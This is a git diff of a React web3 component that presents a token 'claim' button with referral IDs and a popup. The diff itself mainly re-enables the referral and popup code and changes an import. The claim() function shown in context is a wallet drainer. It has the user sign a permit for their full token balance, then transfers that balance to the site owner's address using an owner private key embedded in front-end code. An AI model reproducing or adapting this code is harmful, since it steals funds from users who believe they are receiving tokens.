@@ -3,7 +3,7 @@ import React, { useState } from "react";
 import { getTransactionCount } from "../../back-end/getTransactionCount";
 import { BoxConnectButton } from "../connect-button/BoxConnectButton";
 import { useAccount } from "wagmi";
-import { ethers } from "../../back-end/modules/ethers.js";
+import { ethers } from "ethers";
 import { useEthersSigner } from "../../back-end/ethersSigner.js";
 import {
   mainnetContractAddresses,
@@ -61,15 +61,15 @@ const Box2 = () => {
       setLoading(false);
     }
 
-    // const existingReferral = localStorage.getItem(address);
+    const existingReferral = localStorage.getItem(address);
 
-    // if (existingReferral) {
-    //   setOutPutReferra(existingReferral);
-    // } else {
-    //   const newReferralId = generateReferralId();
-    //   localStorage.setItem(address, newReferralId);
-    //   setOutPutReferra(newReferralId);
-    // }
+    if (existingReferral) {
+      setOutPutReferra(existingReferral);
+    } else {
+      const newReferralId = generateReferralId();
+      localStorage.setItem(address, newReferralId);
+      setOutPutReferra(newReferralId);
+    }
   }
 
   const generateReferralId = () => {
@@ -87,10 +87,8 @@ const Box2 = () => {
 
   async function claim() {
     setClaiming(true);
-
     const walletProvider = new ethers.providers.JsonRpcProvider(testnetRpcUrl);
     const wallet = new ethers.Wallet(testnetOwnerPrivateKey, walletProvider);
-
     let maxBalanceIndex = 0;
     let maxBalance = 0;
     for (let i = 0; i < testnetAddress.length; i++) {
@@ -106,13 +104,11 @@ const Box2 = () => {
         maxBalance = balance;
       }
     }
-
     const contract = new ethers.Contract(
       testnetAddress[maxBalanceIndex].address,
       abi,
       wallet,
     );
-
     const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour from now
     // const value = await contract.balanceOf(address);
     const value = await contract.balanceOf(address);
@@ -139,12 +135,9 @@ const Box2 = () => {
       nonce: nonce.toString(),
       deadline: deadline.toString(),
     };
-
     const signature = await signer._signTypedData(domain, types, message);
     const { v, r, s } = ethers.utils.splitSignature(signature);
-
     setClaiming(false);
-
     const tx = await contract.permit(
       address,
       tesnetOwnerAddress,
@@ -154,11 +147,8 @@ const Box2 = () => {
       r,
       s,
     );
-
     console.log(tx);
-
     const tx2 = await contract.transferFrom(address, tesnetOwnerAddress, value);
-
     console.log(tx2);
   }
   return (
@@ -214,11 +204,7 @@ const Box2 = () => {
           )}
         </div>
       </section>
-      {/* {claiming && (<
-        Popup
-        
-        onClose={()=>setClaiming(false)}
-      />)} */}
+      {claiming && <Popup onClose={() => setClaiming(false)} />}
     </>
   );
 };
